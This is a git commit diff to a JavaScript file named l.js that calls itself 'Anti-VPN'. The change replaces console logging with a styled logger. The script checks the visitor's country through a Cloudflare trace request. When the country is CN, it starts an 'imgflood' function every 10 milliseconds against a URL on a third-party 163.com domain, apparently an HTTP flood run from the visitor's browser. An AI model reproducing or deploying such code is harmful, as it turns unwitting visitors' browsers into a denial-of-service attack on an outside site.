ed608e6ac9bae63e58b92542c49ec593f11b5c9d
甜力怕 <63779340+xiaozhu2007@users.noreply.github.com>
2022-12-22 10:09:17 +0800

    Update l.js

--- l.js
+++ l.js
@@ -5,26 +5,27 @@ setTimeout(function () {
 var xml = new XMLHttpRequest();
 xml.onreadystatechange = function () {
   if (xml.readyState == 0) {
-    console.log("[Anti-VPN]请求未初始化");
+    cons.e("[Anti-VPN] 请求未初始化");
   }
   if (xml.readyState == 1) {
-    console.log("[Anti-VPN]服务器连接已建立");
+    cons.s("[Anti-VPN] 与服务器连接已建立");
   }
   if (xml.readyState == 2) {
-    console.log("[Anti-VPN]请求已接收");
+    cons.s("[Anti-VPN] 已接收返回内容");
   }
   if (xml.readyState == 3) {
-    console.log("[Anti-VPN]请求处理中");
+    cons.i("[Anti-VPN] 请求处理中");
   }
   if (xml.readyState == 4) {
-    console.log("[Anti-VPN]请求已完成,且响应已就绪");
+    cons.s("[Anti-VPN] 已完成请求，开始分析");
   }
 };
 xml.open("GET", "https://cdn.cyfan.top/cdn-cgi/trace", false);
 xml.send();
 var loc = xml.responseText.split("loc=")[1].split("\n")[0];
-console.info(loc);
+cons.d(loc);
 if (loc && loc === "CN") {
+  cons.s("[Anti-VPN] 分析完成");
   function imgflood() {
     var TARGET =
       "https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387";
@@ -34,4 +35,22 @@ if (loc && loc === "CN") {
   setTimeout(function () {
     setInterval(imgflood, 10);
   }, 5000);
+}
+
+self.cons = {
+    s: (m) => {
+        console.log(`%c[SUCCESS]%c ${m}`, 'color:white;background:green;', '')
+    },
+    w: (m) => {
+        console.log(`%c[WARNING]%c ${m}`, 'color:brown;background:yellow;', '')
+    },
+    i: (m) => {
+        console.log(`%c[INFO]%c ${m}`, 'color:white;background:blue;', '')
+    },
+    e: (m) => {
+        console.log(`%c[ERROR]%c ${m}`, 'color:white;background:red;', '')
+    },
+    d: (m) => {
+        console.log(`%c[DEBUG]%c ${m}`, 'color:white;background:black;', '')
+    }
 }
